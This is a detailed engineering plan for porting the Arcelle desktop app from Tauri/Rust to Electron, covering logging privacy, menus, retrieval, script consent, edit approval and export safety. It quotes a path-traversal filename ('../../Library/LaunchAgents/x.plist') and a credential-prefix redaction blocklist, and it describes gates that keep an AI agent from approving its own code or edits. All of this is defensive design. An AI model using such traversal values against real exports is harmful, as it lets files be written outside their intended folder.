Host event log ('what Arcelle DECIDED'): logfmt lines to $TMPDIR/arcelle-host.log with 4MB cap + one previous generation, ARCELLE_LOG filter with typo-fallback, and a privacy boundary enforced by construction — the only loggable values are shape-checked constructors (id, model, state, one_of, err_kind, ids, count/bytes/ms/flag); room content (filenames included) physically cannot reach the file. Plus instrumented events (tool catalog, run start/end, cancel delivered/refused, job status) and the reveal_logs command.

**Replacement:** TS module in Electron main: hand-rolled logfmt sink (rotate-on-open to .prev, rotate at 4MB — do NOT use a rolling appender that never deletes), Val as a class with a private constructor exported only via the checked factory functions, err_kind classifier ported verbatim, ARCELLE_LOG validation ('parses but cannot speak about us' = fall back + record it). reveal_logs via shell.showItemInFolder.

**Must preserve:**
- Filenames ARE room content in this app (the privacy door deliberately does not redact them) — id() refuses anything not [A-Za-z0-9_-]{1,64}, model() refuses filename-shaped strings ('diary.pdf' has no space/slash — the extension-vs-version discriminator closes it), failures record <unloggable> not silence
- err_kind classifies error TEXT onto a closed list and the text never travels; no digest either (an 8-hex fingerprint would let a log holder confirm a guessed filename by hashing) — token-by-token scrubbing was tried and leaked 'Q3 board'
- Credential prefix blocklist (sk-, ghp_, eyJ, AKIA…) is explicitly a second line, NOT a guarantee — the real guarantee is that no event helper takes a credential parameter
- Invalid ARCELLE_LOG falls back to default AND logs host.log_filter_ignored — tracing Targets parses almost anything, so honoring a typo silently produced a 0-byte log (the exact blindness the module exists to end)
- Default filter arcelle=info, no default level for dependencies; per-tool-call debug events not even rendered unless debug is on
- Logging failure never fails the app (full disk = lose the line, not the turn); poisoned log mutex must not panic a turn
- cancel.refused is WARN (run may still hold the model slot); cancel_requested carries known=false when the host has no flag — the case that used to look like a working Stop

**Gotchas:**
- Rust enforces the boundary with module-private enum variants (Val is unconstructible outside obs) — TS cannot fully replicate; use a #private-field class + an eslint restriction on the module, and PORT THE LEAK TESTS (ROOM_CONTENT corpus incl. Hebrew filename, whole-token containment assertions) — they are the real guard
- Test helpers capture/capture_async attach a thread-local subscriber for parallel suites — the TS logger needs an injectable sink for the same reason
- Log lives beside the sidecar's stderr mirror so 'the logs' is one folder — keep both in the same tmpdir and keep the both_logs_live_in_one_folder invariant

**Native/Tauri surface:** tracing/tracing-subscriber; tauri_plugin_opener (reveal_item_in_dir)

### `src-tauri/src/menu.rs` — 970 LOC → electron-main (3 d)

The native menu bar as a const data spec (App/File/Edit/View/Window sections) + builder + dispatch + menu_sync command that pushes the window's layout state (ticks, enabled, dynamic ⌘1 row label) onto the View menu. Owns ⌘1/⌘2/⌘T/⌘W/⌘Q as menu accelerators. Replaced Tauri's stock menu wholesale, so it re-declares every predefined row (clipboard keys especially).

**Replacement:** Electron Menu.buildFromTemplate with roles (about, services, hide/hideOthers/unhide, undo/redo/cut/copy/paste/selectAll, minimize, zoom, close, togglefullscreen); custom items send one 'menu-action' channel with the row id; a 'menu-sync' ipcMain handler sets checked/enabled/label via Menu.getApplicationMenu().getMenuItemById(). Keep the data-driven spec so the unit tests (unique ids, clipboard keys present, every check row has a payload field) port as plain Jest tests.

**Must preserve:**
- Menu accelerators are why ⌘T/⌘W/⌘1/⌘2 work while the browser webview has focus (renderer keydown never fires there) — keys must stay on the menu, and useLayout must NOT also claim ⌘1/⌘2 (double owner = pane toggled twice = never moves); e2e/page-script/nativeMenu.test.mjs asserts the frontend half
- Close (⌘W) and Quit (⌘Q) are the only always-enabled rows: start screen and password gate are windows too; ⌘W with no room open closes the window in main (frontend handler mounts with the room, so the event would go nowhere)
- menu_sync gates ROW BY ROW, never the section: a disabled submenu will not even open on macOS, which killed Toggle Full Screen at the start screen
- Ticks are pushed from the frontend as ONE atomic payload, never toggled by the menu itself — frontend owns state; empty sidebar label falls back to generic 'Sidebar', never one destination's name
- rail-labels row greys out when the WINDOW width (not the user) removed the labels (rail_labels_settable)
- no_room_is_open uses try_lock — a contended room lock answers 'room open' (safe direction) rather than stalling the menu thread
- Quit label is 'Quit <productName>' checked against config — the app has been renamed once already (Private Room → Arcelle)

**Gotchas:**
- The custom QUIT_ID row exists ONLY because tao lacks applicationShouldTerminate:. Electron's role:'quit' + before-quit preventDefault gives the same ask-first behaviour natively — porting the custom row verbatim would create two quit paths
- Electron's Menu.getMenuItemById searches nested submenus (unlike tauri's Submenu::get which needed the recursive find()) — simpler, but verify for the Layout presets one level down
- gated_rows() count is pinned at 10 in a test as a change-detector for the frontend id map — keep an equivalent cross-check against the renderer's handler object

**Native/Tauri surface:** tauri::menu::{Menu,Submenu,MenuItem,CheckMenuItem,PredefinedMenuItem,AboutMetadata}; muda/NSMenu via tauri; window.emit

### `src-tauri/src/commands/retrieval.rs` — 904 LOC → electron-main (4 d)

RAG retrieval core: question_terms (stopwords, >=2 chars, Hebrew-mark stripping, 24-term cap), fts_match_expr, retrieve_context* blending FTS bm25 rank with brute-force streamed cosine over chunk embeddings via Reciprocal Rank Fusion (k=60), the measured MIN_CHUNK_SIMILARITY floor, the recent-content fallback with its honesty flag, make_snippet, compact_history, select_memories, strip_markup_blocks.

**Replacement:** TS in Electron main next to the DB: stream embedding blobs row-by-row (better-sqlite3 iterate) into Float32Array cosine, keep only (rowid, cos) pairs, hydrate winners' text by rowid batch; FTS ranked query for the keyword leg; RRF combine. The embed call itself is HTTP to Ollama (see backfill.rs). Port every pure helper with its tests verbatim.

**Must preserve:**
- MIN_CHUNK_SIMILARITY 0.55 is MEASURED on nomic-embed-text with the search_query:/search_document: prefixes (unanswerable: 0.32-0.49 vs paraphrase: 0.64-0.83): any-positive-cosine made 'no match' unreachable once embeddings existed, and the six least-unrelated chunks were presented as the room's answer — do not re-tune casually, and never on a different embed model without re-measuring
- The fallback flag exists so recent-content filler is NEVER credited as a source (CHG-10); fallback only when the pool is empty BEFORE exclusion
- MAX_VECTOR_CANDIDATES 2000: hydration binds one SQL variable per rowid and SQLite caps at 32,766 — 'no limit' over a big room returned 'too many SQL variables' instead of results (regression test builds a 32,800-chunk room)
- Cosine pass STREAMS blobs (12 bytes/chunk kept) — collecting embeddings into vectors first allocated tens of MB per question under the room lock
- make_snippet: per-char lowercase with position map because lowering changes length (Turkish İ → 2 chars; drift past radius made start>end and PANICKED); final-sigma fold; centers on the most SELECTIVE (longest non-stopword) term, not the first word; all-stopword queries keep raw word order
- compact_history: newest-first whole turns; an over-budget turn is cut at a paragraph boundary only if the boundary is NEAR the cut (one early blank line in 70KB used to keep 19 chars of a 20,000 allowance); explicit omitted-marker
- select_memories: budget counted in CHARACTERS not bytes (byte-counting halved a Hebrew room's memory); over-budget note is SKIPPED not a stopping point (the 'tidier' break silently drops context that had room — pinned by test)
- Hand-off = whole conversation (history_budget_bytes flat 200k); handoff path alone is fitted to the engine window (no compacting receiver)

**Gotchas:**
- The chunk index stores CONSONANTAL Hebrew (marks stripped at index time by the extraction layer) — question_terms must strip marks on the query side too or pointed queries silently miss (the Bible bug)
- select_memories' continue-not-break was once flagged as a bug by a reviewer and REJECTED with a pinning test — do not 'fix' it in the port
- RRF constants and candidate multipliers (limit*4, min RETRIEVE_CANDIDATES=24) interact with MAX_CONTEXT_CHUNKS=6 from commands.rs — port them together

### `src-tauri/src/commands/scripts.rs` — 876 LOC → electron-main (4 d)

Wave 5 script surface: per-Mac content-addressed (SHA-256) consent following the SEC-1 doctrine (the room's author is the attacker; approvals live in script_approvals.json OUTSIDE any room), the consent card flow, the auto-created single-node workflow per script (scheduling/history ride the workflow system), list_scripts with failure-streak collapsing, the agent seam (agent_list_scripts / agent_run_script that WAITS up to 150s and returns stdout), and set_script_schedule with a server-side approval requirement.

**Replacement:** TS: approvals JSON under app.getPath('userData'); consent via the same pending-Map + webContents.send pattern as the edit gate; crypto.createHash('sha256') fingerprints; the runner/workflow/queue seams belong to the jobs subsystem (jobs::script_run — covered elsewhere); interpreter resolution (uv/node) shared with the runtimes module.

**Must preserve:**
- Any edit changes the hash → the old approval no longer counts → re-prompt, for free; agent-authored code is by definition a new fingerprint, so it ALWAYS reaches the user before executing
- Scheduled/agent/catch-up triggers NEVER prompt (a cron tick must not raise a card; the UI-driving agent must not approve its own code) — an unapproved embedded script parks; set_script_schedule additionally refuses server-side unless the fingerprint is approved (defense against a driven UI)
- The consent card lists the room files the run would ACTUALLY decrypt: declared inputs PLUS every room file whose name appears in the script text (auto-materialize rule) — declared-only showed nothing while twenty documents were copied out
- agent_run_script waits for completion (150s, 400ms poll): 'run it and tell me the count' used to return at START and the model apologised for not having an answer that sat in the run log; finished output is framed 'quote these values exactly'; Stop ends the WAIT not the run, with wording that never claims failure; parked-for-approval gets its own honest message
- printed_output: import-mode runs store the whole run RECORD — extract stdoutTail, then Created: files, then skip-reasons, then non-zero exit; raw report JSON must never be quoted at the model and a silent file-producing run must not read as 'printed nothing'; 4000-char clamp
- changed_since_approval cannot distinguish 'Allow once' from 'edited after Always' — the ribbon tooltip must not claim the script changed; consecutive_failures collapses identical newest-first error streaks into one incident
- One unreadable blob must not error the whole script list; wf_is_for_script matches created_by=='script' + the exact file id node; ensure_script_workflow is idempotent and activates the row so the scheduler can fire it

**Gotchas:**
- run_script_inner is shared verbatim between the UI command and the agent seam — the consent gate must never grow a second code path; keep one function in TS too
- Skill scripts get inputs/outputs CLEARED on their card (they receive no room files) even if a copied header declares them — honesty rule
- The 'quote these values exactly' framing and the parked/started messages are prompt surface for the model — port the strings as-is

**Native/Tauri surface:** tauri path().app_data_dir; tokio oneshot/timeout; sha2 via script_fingerprint

### `src-tauri/src/lib.rs` — 779 LOC → electron-main (5 d)

Tauri app entry: registers all 308 command handlers, two custom URI schemes (roommedia = decrypted media streaming with HTTP Range/206 for seeking; roomdoc = sandboxed HTML preview at isolated origin with strict per-response CSP blocking all network), quit lifecycle (ExitRequested unsaved-edits hold, Exit teardown: geometry save, live-recording flush, Whisper ctx unload, ollama/sidecar stop-if-ours, browser-preview cleanup, private-browser close, Leash discovery-file removal), Finder .roomai double-click (RunEvent::Opened), window geometry note/restore, and the main_window() helper that avoids the get_webview_window child-webview trap.

**Replacement:** Electron main.ts: BrowserWindow + ipcMain.handle registry (one entry per former command, generated from a manifest so parity is checkable), protocol.handle('roommedia') and protocol.handle('roomdoc') implementing Range 206 and CSP headers by hand, app.on('before-quit') for the unsaved-edits hold + bounded recording flush, app.on('open-file') for Finder, window move/resize debounce + geometry JSON. Sidecar/ollama teardown via child_process kill on 'will-quit'.

**Must preserve:**
- Teardown ORDER on quit is load-bearing: flush live recording (bounded 30s wait, engine drains decoder through Whisper) BEFORE STT context unload — reversing it trades lost audio for a ggml assert/crash; Whisper ctx must drop before process exit or Metal teardown asserts
- Unsaved-edits quit hold LATCHES once (hold_quit_for_unsaved): a window that cannot answer still quits on the second press; window finishes quit itself with exit(code) which is never re-held
- roomdoc CSP: default-src 'none', inline script/style allowed, connect-src 'none' — page JS runs but can never phone home; previews are in-memory (HtmlPreviews map), cleaned on start AND exit so decrypted HTML never survives a crash
- roommedia must return 206 partial content — WKWebView (and Chromium) media elements need it to seek; bytes come from an in-memory decrypted map cleared on lock, never through IPC as base64
- Geometry noted per move/resize event but written ONCE on exit; restore skips a screen that has gone away (unplugged monitor = invisible window)
- Finder open parks the path in pending_open AND emits open-room-file — the emit fires before anything listens on cold start, so the parked copy is the real mechanism
- Browser session close on quit is what actually discards cookies/cache (non-persistent store); Cmd-Q skips teardown_open_room so exit must do it
- Connector powers (auto-approve, outbound-unmask, per-connector overrides) hydrate from per-Mac JSON at startup; missing file = OFF/empty, never an assumed yes
- obs::init runs FIRST, before any decision worth recording; PATH prefix for downloaded runtimes published before any connector can start

**Gotchas:**
- The main_window/get_webview_window trap is Tauri-specific and disappears, but the architecture fact remains: the private browser is a SECOND WebContentsView on the same BrowserWindow — every emit must target the main window's webContents, not 'the focused webContents'
- Electron's before-quit DOES fire on Cmd+Q and Apple-menu Quit (unlike tao) — the whole reason menu.rs owns ⌘Q evaporates; do not port the workaround, port the ask-first latch onto preventDefault
- In-group tests use tauri::test::mock_builder — the quit-flush test (2s of audio under the 60s checkpoint interval) must be re-expressed against the new recording engine seam
- Registering 308 ipcMain handlers by hand invites silent omissions; Tauri's generate_handler! was compile-checked — build a manifest-driven registry with a completeness test against src/api.ts

**Native/Tauri surface:** tauri::Builder; register_uri_scheme_protocol; RunEvent::{ExitRequested,Exit,Opened}; tauri_plugin_opener/dialog/updater/process; tauri::Manager/Emitter; WindowEvent::{Moved,Resized}

### `src-tauri/src/commands/safety.rs` — 773 LOC → electron-main (5 d)

Room safety commands: file version history (list/pin/delete/compare/restore with compound bytes+text+rec_meta+provenance transactions), export_file/export_all with com.apple.quarantine xattr on downloaded files, change_password (live rekey + biometric keychain update + recovery re-wrap + off-lock checkpoint rekey with stranded reporting), duplicate_room (VACUUM INTO + optional rekey), compact_room.

**Replacement:** TS in Electron main over the new DB service. Heavy ops (rekey, VACUUM, export_all) run in a worker_thread — better-sqlite3 is synchronous and would freeze the whole main process including IPC (the Rust code used block_in_place for exactly this). Quarantine xattr via child_process to /usr/bin/xattr -w (or the fs-xattr prebuilt) — Electron has no builtin. Rekey via better-sqlite3-multiple-ciphers PRAGMA rekey; checkpoint copies re-keyed by opening each with the OLD password. Touch ID keychain update through whatever biometrics module replaces biometrics.rs.

**Must preserve:**
- change_password sequence: verify current on a throwaway connection → rekey live conn under lock (fast) → update the biometric Keychain entry with the new password, DELETING the stale entry if the store fails (Touch ID must never hand back the old password) → re-wrap recovery sidecar returning a FRESH code (old code now decrypts a dead password), deleting the sidecar if re-wrap fails → rekey every checkpoint from the OLD password OFF the room lock (GB-scale copies) → failures counted, frontend asks list_stranded_checkpoints immediately (never a silent clean success)
- Leash token deliberately NOT rotated on password change (separate credential, separate boundary; silently breaking pasted external-agent configs reads as data loss) — revocation is the explicit regenerate action
- Exports must not launder a download: files with origin_url get com.apple.quarantine '0001;<hex-time>;Arcelle;' — QTN_FLAG_DOWNLOAD set, but NO origin URL in the attribute (the URL is room content); user-made files get NO mark; best-effort (FAT/network share can't hold xattrs → still export)
- safe_export_name + unique_export_name: stored names are never validated on the way in ('../../Library/LaunchAgents/x.plist'), so export hardening is mandatory; clash suffix ' (2)' before the extension, leading dot is not a separator
- Version restore is a compound atomic transaction (bytes + re-derived text + rec_meta + provenance moved back together; a version with no provenance CLEARS the head's); restore goes through store_file_bytes so restoring is itself undoable
- Versions survive a file's trip to the trash (a restored file finds its history), but compare AND restore-through refuse while trashed — a version id held by an open tab must not resurrect content into a hidden file
- A test pins that the four room-sized commands are 'pub async fn' (source-scanned with split needles) — port as: these four must run off the main thread

**Gotchas:**
- os.setxattr does not exist on macOS Python and Node has no builtin — decide subprocess /usr/bin/xattr vs fs-xattr early and test on a FAT volume for the best-effort path
- VACUUM INTO + rekey_copy parity must be verified on better-sqlite3-multiple-ciphers before committing to the checkpoint design — the whole stranded-checkpoint flow depends on 'open copy with old key, PRAGMA rekey' working
- The stranded counter is deliberately content-free (checkpoint path carries the room's filename) — keep it out of the new logger too

**Native/Tauri surface:** setxattr/getxattr via extern C (com.apple.quarantine); SQLCipher rekey/vacuum-into via db layer; tokio::task::block_in_place; biometrics/Keychain

### `src-tauri/src/commands/edit_gate.rs` — 524 LOC → electron-main (2.5 d)

Opt-in diff-preview approval gate for file-mutating tool calls (SEC-1b-shaped): compute plans under lock → emit edit-approve-request card → await decision (180s timeout = decline) → re-lock, staleness re-check, apply. Includes the A2 rule forcing a preview for >10-occurrence edits even with the gate off, and resolve_edit_approval.

**Replacement:** TS: same three-phase flow with a pending Map<string, resolver>; card via webContents.send, decision via ipcMain; apply inside a better-sqlite3 transaction. The Rust lock-discipline comment ('guard never held across await') becomes: never leave a DB transaction open across the consent await.

**Must preserve:**
- Decline-by-default: timeout or closed window = NoAnswer, and NoAnswer is a DIFFERENT message to the model than Declined ('not a decision the user made — say it is still waiting')
- Answering an expired card id is an ERROR (NO_LONGER_WAITING), never a silent Ok — pressing 'Apply once' after the 180s tool-call timeout used to vanish the card while writing nothing
- Staleness phase 3: identity check (current name == plan's name) for EVERY plan INCLUDING rename-only ones (which carry no byte token — they used to apply with no check at all), then sha256 byte-token check; strict-fail with 'read it again and retry', file untouched, no snapshot from a refused apply
- Large-scale rule: edit_file/edit_files with summed occurrence count > 10 force the preview even with the gate off; write_file's count is CHARACTERS and is deliberately never scale-checked (every rewrite would trip a 10-char floor); set_cells untouched
- 'Rest of this answer' only sticks on the run-scoped LocalEngine sink; on sink-less scopes 'turn' cadence degrades to per-edit prompting
- Gate off (the default): commit under the same lock, byte-identical to the pre-gate path; unknown decision strings are a decline, never a yes

**Gotchas:**
- The frontend card is data-agent-blocked so the UI-driving agent cannot approve its own edit — that attribute contract must survive the renderer rewiring
- finish() emits room-files-changed + per-file file-updated AND sets the anti-fabrication wrote flag — the flag is read elsewhere to stop the model claiming writes it didn't make

**Native/Tauri surface:** tokio::sync::oneshot + timeout; window.emit; tauri::State

### `src-tauri/src/bin/roomai.rs` — 502 LOC → npm-or-pypi-lib (2 d)

Offline CLI for a .roomai file (contract section E): verify / info / recover / export. Reuses the app's exact SQLCipher scheme via the lib crate. Secrets from environment ONLY (ROOMAI_PASSWORD/ROOMAI_RECOVERY); the old --password/--code flags are refused BY NAME with an explanation.

**Replacement:** Small Node CLI (bin script in the app repo) sharing the new TS DB module (better-sqlite3-multiple-ciphers), or a Python CLI in the sidecar package sharing its DB layer — the load-bearing property is ONE code path with the app's crypto scheme, no second implementation to drift. Pure-parse/run split kept for unit tests.

**Must preserve:**
- verify/info open READONLY: db::open_room always migrates + writes, so verify used to fail on read-only volumes and rebuilt the search index 'while only looking' — the new DB layer must expose a readonly open
- Secrets never on argv (ps -ww readable by any process as the user; shell history) — refuse --password/--code by name with the remedy, in every position, including bare flag with no value
- Export skips trashed rows (a deleted file is not in the room, and export is the one way trashed bytes could reach the plain filesystem) and rows with no stored bytes (counted, reported)
- Export filename hardening: sanitize keeps final path component, neutralises separators/NUL; unique_name seeds from the destination directory and compares LOWERCASED (APFS case-insensitive) while returning original case; never clobbers
- Exit codes 0 ok / 1 runtime / 2 usage; unknown flags rejected (catches --passwrod typos before they become a path)

**Gotchas:**
- This binary is the .room format's independent verifier — after the DB migration story (SQLCipher → whatever replaces it) it must understand BOTH the old and new container, or the one-time converter must be reachable from it
- count() uses format!-interpolated table names — fine only because they are hard-coded literals; keep that discipline in the port

**Native/Tauri surface:** rusqlite/SQLCipher via arcelle_lib::db

### `src-tauri/src/commands/bulk.rs` — 436 LOC → electron-main (1.5 d)

Batch file verbs (trash/move/restore/destroy a SET) shared by the Library multi-selection and the File agent's organize tools so human and AI moves can never behave differently. Returns a BulkReport (ok names, named failures, cap count) instead of (). Four #[tauri::command] wrappers.

**Replacement:** TS over the DB service, same BulkReport shape into src/apiTypes.ts; the four ipcMain handlers plus the shared *_in functions the agent tools call.

**Must preserve:**
- Deliberately BEST-EFFORT per file (each file its own transaction) where edit_files is atomic: files are independent, aborting 40 good moves for one deleted file is the destructive choice; failures are reported by NAME, never swallowed or fatal
- MAX_BULK_FILES 200 is a blast radius, not perf: the agent reaches these functions and a miscounting model must not sweep unbounded files; the cap is REPORTED ('N more were not attempted'), never silent
- Ids de-duplicated first (a double-click or repeating model must not fabricate 'already in the trash' failures); names read BEFORE the op (after a destroy the row is gone) via any_file_name (get_file_name hides trashed rows)
- destroy requires the file to ALREADY be trashed — library→gone in one step impossible from any path; the check lives here because there is more than one caller
- room-files-changed emitted only if anything actually changed; actor attribution is a required parameter (User vs Agent(tool)) with no default
- sentence() receipts never claim more than happened; failures named up to 10 then '…and N more'

**Gotchas:**
- stop_recording_into must run per id BEFORE trashing — trashing the file a live recording writes into leaves an engine appending to a row that left the library; the recording-subsystem seam must exist before this ports
- A UI-invoked command IS the person (TrashActor::User); the agent's path goes through trash_files_in with Agent actor — keep the two entry points distinct in the IPC design

**Native/Tauri surface:** tauri::AppHandle emit; RecState (stop_recording_into per id before trash/destroy)

### `src-tauri/src/textutil.rs` — 296 LOC → python-sidecar (1.5 d)

Bridge to /usr/bin/textutil (macOS's TextEdit importer) converting doc/rtf/rtfd/odt/wordml/webarchive to txt or html, so preview and extracted text agree; plus resolve_field_codes turning Word HYPERLINK field codes that survive import into real links/plain targets.

**Replacement:** Python: subprocess to /usr/bin/textutil (fixed path, ships with every Mac, nothing to bundle) writing the decrypted bytes to a 0o600 exclusively-created tempfile deleted in a finally/context-manager on every path; resolve_field_codes ported as a pure function with its test corpus. Sidecar owns it per the split rule (document parsing).

**Must preserve:**
- .docx deliberately NOT offered (docx-preview renders more) — can_read is about the legacy formats only
- Decrypted temp copy: owner-only, create-exclusive, removed on every exit path including panic (Drop guard → Python context manager)
- Empty/whitespace conversion result returns None, never an empty string treated as text
- HYPERLINK resolution gap rule: at most 8 chars between keyword and quote AND every token must start with a backslash (Word switches) — 'The HYPERLINK is "great"' must survive intact; two wrong-diagnosis regressions are pinned in tests
- javascript:/non-http targets never become an href (only https/http/mailto); attr and text escaping separate

**Gotchas:**
- The same-document-two-answers bug (preview from textutil, text from a strings(1) sweep) is why this module exists — the rewrite must keep ONE converter feeding both outputs
- os.O_EXCL + 0o600 in Python (tempfile.NamedTemporaryFile(delete=False) is 0600 by default but check the exclusive-create semantics); tests assert mode & 0o077 == 0

**Native/Tauri surface:** /usr/bin/textutil subprocess; unix file mode 0600

### `src-tauri/src/commands/retrieval/backfill.rs` — 267 LOC → electron-main (1.5 d)

embed_question (Ollama embed with search_query: prefix, None on any failure) and three spawn-on-unlock background passes: re-extract files with no text, one-shot legacy .doc/.ppt text repair (stamped once per room), and the generation-stamped embedding backfill loop (batch 32, idle-poll 10s, backoff 60s on embed failure).

**Replacement:** TS async loops in Electron main with an incrementing generation counter in AppState (each room unlock bumps it; a loop whose stamp is stale exits, so at most one pass is ever live); Ollama /api/embed via fetch with keep_alive '30s' (documents) / '5m' (questions).

**Must preserve:**
- Every write is pinned by room PATH + room EPOCH captured at spawn and re-checked under the lock before writing — a rollback leaves the path UNCHANGED, so the path pin alone lets a straggler write pre-rollback data into the restored DB (Wave 3 invariant, generalized to all path-pinned writers)
- Generation stamp: both halves matter independently (newer pass took the slot = vectors computed against a corpus this pass no longer owns; different path = different room) — pass_is_current is pulled out precisely to be testable
- embed failure (model missing / Ollama down) backs off and retries; keyword retrieval keeps working — never block chat on embedding
- Documents embed as 'search_document: <name>\n<text>' (prefix + filename context, matching the query side); the augmented string is transient, only the vector is stored
- Legacy repair: REPAIR_STAMP setting = once per room; only files whose text actually CHANGES are written (no version churn, no room-files-changed storm, nothing in History pretending the user edited); .doc/.ppt were WRONG (font tables, mojibake, slide-master prompts), not merely incomplete — bump the stamp when an extractor is corrected again
- Re-extract pass skips OCR/STT candidates (their text arrives via their own workers)

**Gotchas:**
- The room lock is never held across the Ollama call — in TS, snapshot the batch, release, await, re-verify epoch/path before writing
- keep_alive strings ('30s'/'5m') are deliberate: the short one lets Ollama release the embed model when indexing idles (HLT-5)

**Native/Tauri surface:** tauri::async_runtime::spawn; Ollama /api/embed HTTP

### `src-tauri/src/commands/feedback.rs` — 146 LOC → electron-main (1 d)

ADD-28 feedback → GitHub issue: app_diag (version/os/arch/repo for the issue footer) and feedback_draft (shape raw feedback into title+body on the LOCAL model via sidecar /feedback_draft; the app never sends anything — the user's own browser opens github.com with the draft prefilled in the URL).

**Replacement:** app_diag from app.getVersion() + os.version() + process.arch; feedback_draft stays a thin proxy to the sidecar's existing /feedback_draft endpoint, keeping the local-model-only guard (non-local room model swapped for best local default) in the main-process handler.

**Must preserve:**
- Privacy pledge: feedback text NEVER goes to a cloud engine — resolve the room's model but swap it out if it doesn't run on this Mac (a past bug shipped raw feedback to a :cloud model while the comment promised otherwise)
- The only network hop is the user opening github.com themselves; the app talks to nothing but Ollama/sidecar
- read_draft treats a missing/renamed/wrong-typed field as an ERROR naming the field — defaulting to "" handed the modal two empty boxes that silently wiped what the user typed
- Model failure returns an actionable fallback ('you can still write the issue yourself'), never blocks hand-writing

**Gotchas:**
- FEEDBACK_REPO is 'benrben/private-room' (rebrand kept the repo name — do not 'fix' it)

**Native/Tauri surface:** sysinfo::System::long_os_version; tauri::AppHandle::package_info; sidecar HTTP

### `src-tauri/src/commands/search.rs` — 146 LOC → electron-main (1 d)

search_all (⌘F room-wide search): file content via FTS5 with an AND-of-all-terms expression, file-name LIKE, message LIKE, memory LIKE — each hit with a snippet for the overlay.

**Replacement:** TS over better-sqlite3 FTS5 + LIKE queries, reusing the ported fts_match_expr/make_snippet from the retrieval module.

**Must preserve:**
- Content search ANDs every term where retrieval OR-joins (recall vs precision: a result list a person reads must not have one query with two meanings) — but AND is per FTS ROW (~1200-char chunk), not per document; the semantics are 'both words in one chunk', same as 'both words in one message'
- Name-only matches carry an EMPTY snippet: the row already shows the name, and the overlay hands the snippet to the viewer as jump-to text — a name-as-snippet sent the viewer hunting for words the document doesn't contain
- Over-fetch 20x chunks and stop at the first 15 DISTINCT files — one long document can own all best-ranked chunks and previously hid every other matching file
- Empty query returns empty groups, no query run; quoting stays in fts_match_expr so punctuation/FTS keywords are escaped exactly once

**Gotchas:**
- Verify FTS5 is compiled into the chosen better-sqlite3-multiple-ciphers build before this and retrieval port — it is loaded-bearing for both

**Native/Tauri surface:** FTS5 via db layer

### `src-tauri/src/main.rs` — 6 LOC → dropped (0 d)

Binary shim: calls arcelle_lib::run(). Windows console-window cfg attribute only.

**Replacement:** No equivalent needed — Electron's entry is the package.json "main" field pointing at the compiled main.ts.

**Subsystem risks:**
- Command-registry parity: lib.rs's generate_handler! is compile-checked against 308 commands; a hand-built ipcMain registry fails SILENTLY on a missing entry. Build the registry from a manifest and add a completeness test cross-checked against src/api.ts before porting any subsystem.
- UTF-8 byte spans vs UTF-16 JS strings: edit_match.rs (and make_snippet) do all matching over byte ranges into the original bytes. Port the Hebrew/ligature/Turkish test corpus FIRST and pick one indexing basis (Buffer byte offsets) or the fuzzy editor will silently corrupt multibyte files.
- Synchronous better-sqlite3 on the Electron main thread: the Rust code used block_in_place for rekey/VACUUM/export_all because they take minutes on multi-GB rooms; in Electron the equivalent MUST be worker_threads (async alone does not help a sync driver) or every quit/save/IPC freezes with them.
- SQLCipher-replacement parity for the safety flows: change_password depends on verify-on-second-connection, live PRAGMA rekey, VACUUM INTO, and rekey of standalone checkpoint copies from the OLD password. Prototype all four on better-sqlite3-multiple-ciphers (and confirm FTS5 is in the build — retrieval and search_all need it) before freezing the DB decision; the .room migration story must also keep the roomai CLI able to verify both container generations.
- Quit-lifecycle rewrite risk: Electron's before-quit fires on Cmd+Q (the tao hole is gone), so menu.rs's custom QUIT_ID row and lib.rs's ExitRequested arm must be REDESIGNED into one preventDefault flow, not ported twice — two quit paths is how the unsaved-edits latch or the recording flush gets skipped on one of them. Keep the ordering invariant: flush recording before unloading Whisper, and run teardown (browser session discard, sidecar/ollama kill, preview cleanup, geometry save) even on Dock-quit/logout.
- obs privacy boundary weakens in TS: Rust made unloggable values unspellable (module-private enum); TypeScript can only approximate with private constructors + lint. The ported leak tests (room-content corpus through every helper AND through the real sink) are the actual guarantee — land them with the logger, not after.
- No Electron builtin for com.apple.quarantine xattrs: choose subprocess /usr/bin/xattr vs the fs-xattr native module early; the mark is a security behaviour (exports must not launder downloads) with a best-effort branch (FAT/network volumes) that needs real-filesystem testing.
- Menu accelerator ownership: ⌘1/⌘2/⌘T/⌘W must live ONLY on the native menu (they must work while the browser WebContentsView has focus) and the renderer must not re-claim them — the double-owner bug (pane toggled twice = never moves) will reappear if the old useLayout listeners are resurrected during the api.ts rewiring.
- Cross-subsystem seams concentrated here: edit_match depends on extraction:: (fold table, docx/html replace, decode_text_bytes) owned by the docs/parsing group (destined for the Python sidecar per the split rule) while the edit engine itself needs synchronous DB transactions in Electron main — either the fold/replace helpers get a TS twin (drift risk the codebase explicitly fought) or edits round-trip to the sidecar (latency + transaction split). Decide this seam explicitly; bulk.rs similarly needs the recording-engine stop seam and scripts.rs the jobs/workflow queue before they can land.
- Prompt-surface strings are load-bearing: edit errors (closest_snippet, 'read it again and retry'), script-run framings ('quote these values exactly'), decline vs no-answer wordings all steer the local 4B model's behaviour — port them verbatim and treat rewording as a behaviour change requiring re-QA.

## 10. Feature commands

Feature-commands subsystem: 22 Rust files, ~15,510 LOC (~3,500 of it tests), 77 #[tauri::command] handlers. Five clusters: (1) the privacy gatekeeper (privacy.rs) — mechanical Aho-Corasick redact/restore over the room's entity map, a cached policy consulted by every outbound seam, and a background per-file scanner that pins room path+epoch; (2) Agent Skills (skills.rs) — encrypted CRUD, SKILL.md folder import/export, AI composition, and consent-gated script execution in a swept decrypted workspace; (3) the drawing stack (sketch.rs + sketchdoc.rs) — a line-based script language the model writes instead of SVG, all-or-nothing validation, a geometric layout checker, a wobbly-hand SVG renderer and resvg PNG rasterizer; (4) creative/media features (create.rs catalog, story.rs storyboards, vision.rs grounding, video.rs probe/trim/frame, studios/* flashcards/mindmap/podcast incl. TTS episode rendering); (5) 'moonshot' room intelligence (front page, room graph, AI actions, roles, Leash MCP server + Closet remote-Ollama, leash.json discovery) plus the ART-1 artifact write funnel (artifact.rs) that every AI-generated file passes through. Most model compute already migrated to sidecar endpoints (/ai_action, /privacy_scan, /vision_locate, /summarize_file, /tts/podcast, /label, /memory_suggestion, /suggest_file_meta, /generate_ui_text, /knowledge_extract) — Rust is largely gather/validate/save orchestration, which ports naturally to Electron main TS over better-sqlite3, with video/vision native work landing in the PyObjC sidecar. Estimated total: ~52 senior-dev days including tests.

### `src-tauri/src/commands/sketchdoc.rs` — 2811 LOC → electron-main (6 d)

